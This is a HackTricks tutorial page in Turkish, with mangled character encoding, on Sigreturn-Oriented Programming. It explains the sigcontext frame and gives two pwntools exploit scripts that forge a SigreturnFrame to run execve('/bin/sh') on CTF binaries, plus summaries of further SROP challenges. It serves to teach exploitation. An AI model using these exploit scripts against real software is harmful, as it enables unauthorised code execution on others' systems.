# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

- Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z [ABONELÄ°K PLANLARI](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
- [Resmi PEASS & HackTricks Ã¼rÃ¼nlerini](https://peass.creator-spring.com) edinin
- [The PEASS Family](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [NFT'lerimiz](https://opensea.io/collection/the-peass-family) ile
- ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [@hacktricks\_live](https://twitter.com/hacktricks\_live)'Ä± takip edin.
- Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek [HackTricks](https://github.com/carlospolop/hacktricks) ve [HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

**`Sigreturn`,** Ã¶zellikle bir sinyal iÅŸleyicisinin yÃ¼rÃ¼tmesini tamamladÄ±ktan sonra temizlik yapmak iÃ§in kullanÄ±lan Ã¶zel bir **sistem Ã§aÄŸrÄ±sÄ±dÄ±r**. Sinyaller, genellikle olaÄŸanÃ¼stÃ¼ bir durumun meydana geldiÄŸini belirtmek iÃ§in iÅŸletim sistemi tarafÄ±ndan bir programa gÃ¶nderilen kesintilerdir. Bir program bir sinyal aldÄ±ÄŸÄ±nda, mevcut Ã§alÄ±ÅŸmasÄ±nÄ± geÃ§ici olarak durdurur ve sinyali bir **sinyal iÅŸleyici** ile iÅŸlemek Ã¼zere tasarlanmÄ±ÅŸ Ã¶zel bir iÅŸlevle ele alÄ±r.

Sinyal iÅŸleyicisi iÅŸini bitirdikten sonra, programÄ±n **Ã¶nceki durumuna geri dÃ¶nmesi** gerekir, sanki hiÃ§bir ÅŸey olmamÄ±ÅŸ gibi. Ä°ÅŸte burada **`sigreturn`** devreye girer. ProgramÄ±, sinyal iÅŸleyicisinden **geri dÃ¶nmeye** ve sinyal iÅŸleyicisi tarafÄ±ndan kullanÄ±lan **yÄ±ÄŸÄ±n Ã§erÃ§evesini** (iÅŸlev Ã§aÄŸrÄ±larÄ±nÄ± ve yerel deÄŸiÅŸkenleri depolayan bellek bÃ¶lÃ¼mÃ¼) temizleyerek programÄ±n durumunu geri yÃ¼klemeye yardÄ±mcÄ± olur.

Ä°lginÃ§ olan kÄ±sÄ±m, **`sigreturn`**'un programÄ±n durumunu nasÄ±l geri yÃ¼klediÄŸidir: bunu yaparak, **CPU'nun tÃ¼m kayÄ±t deÄŸerlerini yÄ±ÄŸÄ±nda depolar.** Sinyal artÄ±k engellenmediÄŸinde, **`sigreturn` bu deÄŸerleri yÄ±ÄŸÄ±ndan Ã§Ä±karÄ±r**, CPU'nun kayÄ±tlarÄ±nÄ± etkin bir ÅŸekilde sinyal iÅŸlendiÄŸinden Ã¶nceki durumlarÄ±na sÄ±fÄ±rlar. Bu, mevcut yÄ±ÄŸÄ±nÄ±n en Ã¼stÃ¼ne iÅŸaret eden yÄ±ÄŸÄ±n iÅŸaretÃ§isi kaydÄ±nÄ± (RSP) de iÃ§erir.

{% hint style="danger" %}
Bir ROP zincirinden **`sigreturn`** sistem Ã§aÄŸrÄ±sÄ±nÄ± Ã§aÄŸÄ±rarak ve **yÄ±ÄŸÄ±nda yÃ¼klemek istediÄŸimiz kayÄ±t deÄŸerlerini ekleyerek** tÃ¼m kayÄ±t deÄŸerlerini **kontrol etmek** ve bu nedenle Ã¶rneÄŸin `/bin/sh` ile `execve` sistem Ã§aÄŸrÄ±sÄ±nÄ± **Ã§aÄŸÄ±rmak mÃ¼mkÃ¼ndÃ¼r**.
{% endhint %}

Dikkat edin, bu, diÄŸer Ret2syscall'larÄ± Ã§aÄŸÄ±rmayÄ± kolaylaÅŸtÄ±ran bir tÃ¼r Ret2syscall olacaktÄ±r:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

Merak ediyorsanÄ±z, bu, daha sonra deÄŸerleri kurtarmak iÃ§in yÄ±ÄŸÄ±nda depolanan **sigcontext yapÄ±sÄ±**'dÄ±r (ÅŸemaya [**buradan**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html) bakÄ±n):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Daha iyi bir aÃ§Ä±klama iÃ§in aÅŸaÄŸÄ±daki linke bakabilirsiniz:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Ã–rnek

[**Bir Ã¶rnek bulabilirsiniz burada**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) burada signeturn Ã§aÄŸrÄ±sÄ± ROP aracÄ±lÄ±ÄŸÄ±yla oluÅŸturulmuÅŸtur (rxa'ya `0xf` deÄŸeri yerleÅŸtirilmiÅŸtir), ancak bu oradan gelen son saldÄ±rÄ±dÄ±r:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
AyrÄ±ca [**buradan exploit**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)'u kontrol edin, burada ikili zaten `sigreturn` Ã§aÄŸÄ±rÄ±yordu ve bu nedenle bunu bir **ROP** ile oluÅŸturmak gerekli deÄŸil:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## DiÄŸer Ã–rnekler ve Referanslar

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **`sigreturn`** sistem Ã§aÄŸrÄ±sÄ±nÄ± Ã§aÄŸÄ±ran ve ardÄ±ndan yÄ±ÄŸÄ±nÄ± **doldurmayÄ±** saÄŸlayan derleme ikili dosyasÄ±. YÄ±ÄŸÄ±nda bir [**ret2syscall**](../rop-syscall-execv/) yazmak ve yÄ±ÄŸÄ±nda bulunan bayraÄŸÄ± okumak mÃ¼mkÃ¼ndÃ¼r, bayrak derleme ikilisinin belleÄŸinde bulunmaktadÄ±r.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **`sigreturn`** sistem Ã§aÄŸrÄ±sÄ±nÄ± Ã§aÄŸÄ±ran ve ardÄ±ndan yÄ±ÄŸÄ±nÄ± **doldurmayÄ±** saÄŸlayan derleme ikili dosyasÄ±. YÄ±ÄŸÄ±nda bir [**ret2syscall**](../rop-syscall-execv/) yazmak mÃ¼mkÃ¼ndÃ¼r, derleme ikilisinde `/bin/sh` dizesi bulunmaktadÄ±r.
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bit, relro yok, canary yok, nx, pie yok. `gets` iÅŸlevini kÃ¶tÃ¼ye kullanarak basit bir tampon taÅŸmasÄ±, [**ret2syscall**](../rop-syscall-execv/) gerÃ§ekleÅŸtiren kÄ±yafetlerin eksikliÄŸi ile. ROP zinciri, `/bin/sh`'yi `.bss`'ye yazmak iÃ§in tekrar gets Ã§aÄŸÄ±rarak yazar, **`alarm`** iÅŸlevini kullanarak eax'Ä± `0xf` olarak ayarlamak iÃ§in **SROP** Ã§aÄŸÄ±rmak ve bir kabuk Ã§alÄ±ÅŸtÄ±rmak iÃ§in.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bit derleme programÄ±, relro yok, canary yok, nx, pie yok. AkÄ±ÅŸ, yÄ±ÄŸÄ±nda yazma, birkaÃ§ kaydÄ± kontrol etme ve bir sistem Ã§aÄŸrÄ±sÄ± yapma ve ardÄ±ndan `exit` Ã§aÄŸÄ±rma izni verir. SeÃ§ilen sistem Ã§aÄŸrÄ±sÄ±, registreleri ayarlayacak bir `sigreturn`'dÄ±r ve bir Ã¶nceki sistem Ã§aÄŸrÄ±sÄ± talimatÄ±nÄ± Ã§aÄŸÄ±rmak ve `memprotect`'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in `eip`'yi ayarlayacaktÄ±r, bÃ¶ylece ikili alanÄ± `rwx` olarak ayarlar ve ESP'yi ikili alana ayarlar. AkÄ±ÅŸÄ± takip ederek, program ESP'yi tekrar okumak iÃ§in ESP'yi ikinci kez okuyacak, ancak bu durumda ESP bir sonraki talimatÄ± iÅŸaret edeceÄŸi iÃ§in bir kabuk kodu geÃ§irerek onu bir sonraki talimat olarak yazacak ve Ã§alÄ±ÅŸtÄ±racaktÄ±r.
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROP, bir kabuk kodunun yerleÅŸtirildiÄŸi yere yÃ¼rÃ¼tme ayrÄ±calÄ±klarÄ± (memprotect) vermek iÃ§in kullanÄ±lÄ±r.

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ **Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking hilelerinizi paylaÅŸarak HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>
